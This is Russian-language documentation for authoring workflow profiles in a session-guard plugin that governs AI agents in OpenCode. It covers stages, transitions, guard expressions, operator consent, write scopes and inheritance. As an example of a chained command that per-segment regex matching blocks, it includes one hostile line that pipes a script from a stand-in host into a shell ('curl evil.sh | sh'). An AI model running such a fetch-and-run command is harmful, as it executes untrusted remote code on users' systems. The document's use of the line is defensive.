# Как написать свой профиль

Документ для того, кто **делает собственный профиль**: описывает структуру
профиля, схему workflow целиком, готовые примеры и способ проверки.

Если вы профили не пишете, а просто работаете под управлением плагина — вам
нужен [architecture-overview.md](architecture-overview.md).

---

## 1. Что такое профиль

Профиль — каталог, в котором лежит всё, чем ваш workflow отличается от чужого:
машина состояний, роли агентов и правила проверки файлов.

Путь `profiles/<id>/` в этом документе — source profile directory. В целевом
проекте тот же материал должен быть доступен через настроенный
`SESSION_GUARD_PROFILES_DIR` (по умолчанию `<project>/.opencode/profiles`).

```
profiles/<id>/
  profile.json     — паспорт: имя, список схем, агенты, инварианты
  <schema>.yaml    — сама машина состояний (схем может быть несколько)
  agents/          — промпты агентов, по файлу на роль
  invariants.ts    — проверки файлов (необязательно)
```

`profile.json`:

```json
{
  "id": "base",
  "description": "Базовый профиль. Все профили наследуют от него.",
  "schemas": ["base.yaml"],
  "agentsDir": "agents",
  "skillsDir": "skills",
  "agents": ["architect", "code", "review", "qa", "orchestrator"],
  "skills": [],
  "invariants": ["LF_ONLY"]
}
```

Профиль может держать **несколько независимых схем**, но сессия выполняет ровно
одну. С одной схемой её можно не называть; с несколькими — обязательно, в форме
`<profileId>/<schemaId>`, иначе выбор был бы угадыванием.

Каталог профилей задаётся переменной `SESSION_GUARD_PROFILES_DIR`.

## 2. Синхронизация промптов агентов

Файлы из профиля являются исходниками промптов. При запуске OpenCode плагин
обрабатывает синхронизацию на config-хуке: сначала регистрирует команды и
служебного агента `session-guard`, затем синхронизирует агентов всех профилей и
только после этого возвращает конфигурацию хосту.

Для каждого профиля используются следующие пути:

```text
Источник: profilesDir/<profileId>/<agentsDir>/<agent>.md
Цель:    <project>/<OPENCODE_HARNESS_DIR>/agents/<profileId>_<agent>.md
```

`agentsDir` берётся из `profile.json`; если поле не указано, используется
`agents`. `OPENCODE_HARNESS_DIR` по умолчанию равен `.opencode`. Целевой каталог
общий для всех профилей, поэтому идентификатор
профиля добавляется к имени файла и предотвращает конфликт одинаковых ролей в
разных профилях.

### Какие файлы синхронизируются

- обрабатываются только обычные файлы с расширением `.md`;
- если в metadata есть `agents`, синхронизируются только имена из этого списка;
- если `agents` не указан, синхронизируются все `.md` в `agentsDir`;
- файл, отсутствующий в объявленном списке, не копируется.

Перед записью к содержимому добавляется marker владения:

```text
# MANAGED BY session-guard — do not edit
```

Для файла с YAML frontmatter marker вставляется после закрывающего `---`, чтобы
не повредить frontmatter.

### Файлы целевого каталога

При синхронизации плагин различает управляемые и пользовательские файлы по
marker:

- существующий файл без marker не перезаписывается; в журнале появляется
  `COLLISION`;
- существующий файл с marker обновляется содержимым профиля;
- существующий целевой файл с именем профиля, которого больше нет в исходном
  наборе, удаляется только при наличии marker;
- файл без marker сохраняется;
- исходные файлы в `profilesDir` синхронизация не удаляет.

Проверка выполняется для всех каталогов профилей. Профиль без `profile.json`
пропускается. Если `profile.json` невозможно прочитать, каталог исходных
агентов отсутствует или отдельный файл невозможно прочитать, плагин пишет
диагностику и продолжает работу с доступными файлами. Ошибка синхронизации не
должна скрывать регистрацию остальных профилей.

После прохода плагин обновляет `.opencode/agents/.gitignore`: туда попадают
только файлы с marker. Пользовательские файлы в этом
каталоге не скрываются и не удаляются.

## 3. Из чего состоит схема

| Раздел              | Назначение                                                       |
| ------------------- | ---------------------------------------------------------------- |
| `extends`           | Наследование другой схемы: `profileId/file.yaml`                 |
| `stages`            | Стадии и их параметры                                            |
| `transitions`       | Рёбра между стадиями                                             |
| `gates`             | Список проверок, на которые стадии могут ссылаться               |
| `editingAgents`     | Агенты, которых workflow считает исполнителями                   |
| `taskControlAgents` | Кому разрешено менять состояние задач (по умолчанию оркестратор) |
| `stageAssignments`  | Правила вывода стадии по состоянию сессии вместо `currentStage`  |

Стадия может объявить: `loop`, `dispatch`, `retryBudget`, `allowedAgents`,
`actions`, `gates`, `entryGuards`, `exitGuards`, `stages`, `transitions` — и
ничего сверх того. Неизвестный ключ — это **ошибка компиляции**, а не молча проигнорированное
поле.

### Порядок объявления значим

Ключей `initial:` и `entry:` нет намеренно. **Первая** стадия в `stages:` —
стартовая. **Первая** вложенная стадия цикла — та, на которой открывается прогон
задачи. Перестановка блоков меняет поведение.

## 4. Стадии

Простейшая стадия — имя и ничего больше:

```yaml
stages:
  planning: {}
  done: {}
```

### Кому здесь можно работать

```yaml
stages:
  verify:
    allowedAgents: [reviewer, tester]
    gates: [review, qa]
```

`allowedAgents` проверяется при допуске workflow-задачи к этой стадии. Если
стадия объявляет `gates`, агент из этого списка может вернуть
`<workflow-result>` с именем одного из этих гейтов. `gates` — чего стадия ждёт:
пока не закрыты все перечисленные, она не считается пройденной. Имена агентов
и гейтов независимы; имена гейтов должны совпадать с именами, которые используют
guards. Compiler проверяет только синтаксис guard и не выявляет опечатки в этих
ссылках.

### Что здесь можно делать: `actions:`

Стадия объявляет список разрешённых действий. **Отсутствует — список действий
не ограничен**, но runtime всё равно применяет встроенный запрет прямых
`git commit` и `git push`; объявленный список исчерпывающий.

```yaml
stages:
  planning:
    actions:
      # осмотреться можно
      - action: bash
        commands: ['git status', 'git diff.*', 'git log.*']
  code:
    actions:
      - action: edit
        paths: ['src/**']
        guard: "session.approved('plan')"
      - action: bash
        commands: ['mise run test', 'mise run build']
        guard: "session.approved('plan')"
```

- `action` — `bash` или `edit` (семейство `edit`/`write`/`apply_patch`).
- `paths:` делит записи `edit` по маскам.
- `commands:` делит `bash` по **якорным** регуляркам, применяемым к каждому
  сегменту команды по отдельности. Поэтому `mise run test && curl evil.sh | sh`
  не пройдёт по паттерну `mise run test`: совпасть должен каждый сегмент.
- `guard:` — условие; записи разбираются в порядке объявления, побеждает первая
  с совпавшим дискриминатором и истинным условием. Узкую маску ставьте выше.
- `delivers: true` на записи `bash` означает доставку (коммит): ядро не входит в
  жизненный цикл мутации, выдаёт permit до вызова и сверяет HEAD после.

Отказ называет себя отказом:

```
Refused: 'bash' is declared on this stage, but no entry covers the command '…'
```

**Внимание при наследовании:** `actions` — одно поле стадии. Потомок,
объявивший свой список, заменяет родительский целиком. Добавляя свою команду
сборки, перепишите и запись `edit`, иначе правки останутся без условия. Молча.

### Стадия-цикл

Стадия, назвавшая список задач, выполняет свои вложенные стадии по разу на
задачу:

```yaml
stages:
  execution:
    loop: implementation # список задач
    dispatch:
      strategy: serial # serial | parallel | serial_with_overlap
    retryBudget:
      maximum: 5
    stages:
      code:
        allowedAgents: [coder]
      verify:
        allowedAgents: [reviewer, tester]
        gates: [review, qa]
    transitions: # эти рёбра двигают ОДНУ задачу
      - from: code
        to: verify
        guard: "task.checks == 'passed'"
      - from: verify
        to: done # `done` здесь — конец задачи, не стадия
        guard: "task.gates.review == 'passed' && task.gates.qa == 'passed'"
      - from: verify
        to: code
        guard: "task.gates.review == 'failed' || task.gates.qa == 'failed'"
        effects:
          - bumpRetry: task.id
```

Два уровня рёбер не путайте: `transitions` внутри стадии двигают **задачу**
между вложенными стадиями, `transitions` верхнего уровня двигают **сессию**
между стадиями. Цель `done` внутри цикла — это «задача закончена», а не стадия
`done` схемы.

Цикл без объявленных `transitions` двигается по порядку объявления: каждая
вложенная стадия ведёт к следующей, последняя завершает задачу.

Для `parallel` требуется положительный `maxConcurrent`. `loop` принимает имя
статического списка либо `$currentTask.id` — так объявляется вложенный цикл над
подзадачами текущей задачи.

### Охрана входа и выхода

```yaml
stages:
  deploy:
    entryGuards:
      - "allTasksCompleted('test_suite')"
    exitGuards:
      - '!hasPendingTasks()'
```

`entryGuards` не пускают в стадию, `exitGuards` не выпускают из неё — и
проверяются перед **любым** departure, включая то ребро, что заканчивает задачу.

**Важно:** на уровне сессии фактов о задаче нет. Guard стадии верхнего уровня,
написанный про `task.*`, вечно ложен, а вечно ложный guard — это закрытая
дверь. Пишите там сессионные факты: `allTasksCompleted('list')`,
`hasPendingTasks()`, `session.gates.*`.

## 5. Переходы

```yaml
transitions:
  - from: planning
    to: tasks_ready
    guard: 'session.refs.plan != null'
    consent: plan
```

Поля: `from`, `to`, необязательные `guard`, `effects`, `consent`, `onFailure`
(`retry` или `terminal`).

Между одной парой стадий можно объявить несколько рёбер — их различают guard-ы;
проверяются они в порядке объявления, побеждает первое подходящее.

`effects` — то, что делает само ребро:

```yaml
effects:
  - bumpRetry: cycles
    maxAttempts: 3
  - approve: deploy
```

### Согласие оператора

`consent: <имя>` держит ребро закрытым, пока оператор не даст согласие **этого
имени**. Имя произвольное:

```yaml
- from: deploy
  to: smoke
  guard: "session.gates.deploy_done == 'passed'"
  consent: deploy
```

Агент называет то же имя инструменту:

```
workflow-consent  files: ["plan.md"]  summary: "…"  type: "deploy"
```

`type` отсутствует — значит `plan`. Имя входит в подпись манифеста, поэтому
согласие на одно нельзя выдать за согласие на другое. В сессии сохраняются
запись approval и `session.refs.<имя>`; ответ оператора обрабатывается через
манифест вопроса.

## 6. Язык guard-ов

Guard — выражение над фактами. Ошибка вычисления даёт `false`: невычислимое
условие не считается выполненным.

**Факты сессии** (доступны всегда):

| Выражение                         | Что это                                  |
| --------------------------------- | ---------------------------------------- |
| `session.gates.<id>`              | статус гейта сессии                      |
| `session.refs.<имя>`              | путь документа, на который дано согласие |
| `session.currentStage`            | текущая стадия                           |
| `session.revision`                | номер ревизии                            |
| `session.deliveryReceipt`         | расписка о доставке                      |
| `session.checks`                  | вердикт ядра о последнем ходе вне цикла  |
| `session.approved('plan')`        | дано ли согласие с этим именем           |
| `session.verified(stage, status)` | есть ли такая запись верификации         |
| `allTasksCompleted('list')`       | все ли задачи списка завершены           |
| `hasPendingTasks()`               | есть ли задачи в работе                  |
| `isExhausted('budget')`           | исчерпан ли бюджет повторов              |

**Факты задачи** (только внутри цикла):

| Выражение         | Что это                                   |
| ----------------- | ----------------------------------------- |
| `task.id`         | идентификатор задачи                      |
| `task.stage`      | вложенная стадия, на которой она стоит    |
| `task.status`     | статус прогона                            |
| `task.gates.<id>` | гейт этой задачи                          |
| `task.checks`     | вердикт ядра о последнем ходе этой задачи |

### Вердикт ядра: `checks`

`checks` — то, что движок вынес о ходе, **посмотрев на диск**: упал ли
инструмент, писал ли ход вне своей области записи, посчитался ли дифф, прошли ли
инварианты. Значения как у гейтов: `passed` / `failed`.

Это намеренно **не гейт**. Гейты пишет агент через `<workflow-result>`, и любой
объявленный стадией гейт он может выставить себе сам — для `review` и `qa` это и
нужно. `checks` ценен тем, что от рассказа агента не зависит.

Внутри цикла он читается как `task.checks`, вне цикла — как `session.checks` и
живёт ровно одну стадию: при переходе сбрасывается.

## 7. Область записи задачи

Каждая задача может объявить `readScope` и `writeScope` — независимые друг от
друга glob-маски.

**Отсутствующий или пустой `writeScope` означает задачу только для чтения:**
любая запись отклоняется. Это самая частая ошибка при первом знакомстве.

```json
{ "writeScope": ["src/auth/**"], "status": "pending" }
```

Ловушка «голой директории» — маска без `/**` не совпадает ни с чем внутри:

```
writeScope: ['src/auth']      # НЕ совпадает с src/auth/login.ts
writeScope: ['src/auth/**']   # совпадает
```

Отрицание (`!…`) не поддерживается и отвергается при валидации.

При параллельном допуске пересечение масок считается **консервативно**: ложное
пересечение приемлемо, ложное непересечение — нет. Поэтому `src/*.ts` и
`src/*.tsx` будут признаны пересекающимися, хотя фактически не пересекаются.

`writeScope` проверяется до выполнения для `write`/`edit`/`apply_patch`. Для
`bash` проверка до выполнения невозможна — у вызова нет аргумента-пути; выход за
пределы виден только постфактум, через дифф.

`readScope` — это фокус задачи, а не запрет агенту увидеть другие данные.
`writeScope` — независимое разрешение на запись; отсутствующий или пустой список
делает задачу read-only.

## 8. Конец workflow

**Терминальная стадия — объявленная в `stages:`, из которой не ведёт ни одного
ребра.** Ключа для этого нет: конец определяется объявлением, как и старт.
Концов может быть несколько — в базовом профиле их два, `done` и `failed`.

Дойдя до конца, сессия **уезжает из рантайма в архив** и перестаёт чем-либо
управлять. Ничего не теряется: расписка, гейты, вердикты и одобрения остаются
целы, их читают TUI и dashboard.

Тогда же пишется `session.outcome` — чем и почему кончилось: ребро, его `guard`
дословно, провалившиеся гейты и исчерпанные бюджеты. Причину называет ваша
схема, а не ядро.

Компилятор требует двух вещей и обе проверяет:

- у workflow должен быть хотя бы один конец — иначе он крутится вечно;
- из каждой стадии должен быть путь к концу — забытое ребро это ошибка сборки, а
  не тихое зависание.

Вторая проверка не делается, если объявлены `stageAssignments`: там стадия
выбирается по условию, а не по рёбрам.

## 9. Наследование

```yaml
extends: 'base/base.yaml'
```

Правила слияния:

- **Стадии** сливаются по именам: одноимённая стадия потомка дополняет
  родительскую, остальные остаются как были.
- **Поля стадии** заменяются целиком, а не сливаются. Объявили `actions` —
  заменили родительский список.
- **Рёбра** сливаются по паре `from → to`: переобъявив пару, вы заменяете **всю
  группу** родительских рёбер этой пары, а не одно из них.
- **Списки верхнего уровня** (`editingAgents`, `gates`, `taskControlAgents`,
  `stageAssignments`) заменяются целиком.

На уровне `profile.json` агенты профилей, напротив, накапливаются по цепочке:
профиль получает собственных агентов и агентов предков без дублей. `skills` и
`invariants` берутся из ближайшего звена, объявившего соответствующий список.

Цепочка наследования разворачивается полностью: в C → B → A потомок получает и
стадии A.

## 10. Примеры

### Минимальный линейный workflow

```yaml
stages:
  planning: {}
  review: {}
  done: {}

transitions:
  - from: planning
    to: review
    guard: 'session.refs.plan != null'
  - from: review
    to: done
    guard: "session.gates.review == 'passed'"
```

### Работа по задачам с проверкой

```yaml
stages:
  planning:
    actions:
      - action: bash
        commands: ['git status', 'git diff.*']
  execution:
    loop: implementation
    stages:
      code:
        allowedAgents: [coder]
        actions:
          - action: edit
            paths: ['**']
            guard: "session.approved('plan')"
      verify:
        allowedAgents: [reviewer, tester]
        gates: [review, qa]
    transitions:
      - from: code
        to: verify
        guard: "task.checks == 'passed'"
      - from: verify
        to: done
        guard: "task.gates.review == 'passed' && task.gates.qa == 'passed'"
  done: {}
  failed: {}

transitions:
  - from: planning
    to: execution
    guard: 'session.refs.plan != null'
    consent: plan
  - from: execution
    to: done
    guard: "allTasksCompleted('implementation')"
```

### Конвейер с двумя согласиями

```yaml
stages:
  init: {}
  build:
    gates: [build_done]
  deploy:
    gates: [deploy_done]
    entryGuards:
      - "session.gates.build_done == 'passed'"
  smoke:
    gates: [smoke]
  done: {}

transitions:
  - from: init
    to: build
    guard: 'session.refs.plan != null'
    consent: plan
  - from: build
    to: deploy
    guard: "session.gates.build_done == 'passed'"
  - from: deploy
    to: smoke
    guard: "session.gates.deploy_done == 'passed'"
    consent: deploy
  - from: smoke
    to: done
    guard: "session.gates.smoke == 'passed'"
```

### Пример ошибки

```yaml
stages:
  execution:
    dispatch:
      strategy: parallel
```

Неполный: для `parallel` требуется положительный `maxConcurrent`. Синтаксически
корректный YAML рабочей схемой не является.

## 11. Как проверять

Компилятор ловит до запуска: неизвестные ключи, недостижимые стадии, стадии без
пути к концу, workflow без конца, гейт, не объявленный в словаре, неразбираемый
guard.

Чего компилятор не поймает — проверяйте прогоном:

- happy path проходится целиком;
- согласие спрашивается там, где задумано, и отказ действительно держит;
- путь неуспеха не создаёт вечный цикл;
- бюджет повторов исчерпывается и передаёт решение оператору;
- `actions:` каждой стадии разрешает ровно то, что нужно её работе — и запрещает
  остальное.

Последнее проверяйте отдельно: стадия, где `actions:` забыли, разрешает всё.

Для source repository базовые проверки выполняются так:

```bash
mise run check
mise run build
```

Для поведения на реальном OpenCode используйте `mise run smoke`; это не
проверка target project и не заменяет его подключение к хосту.
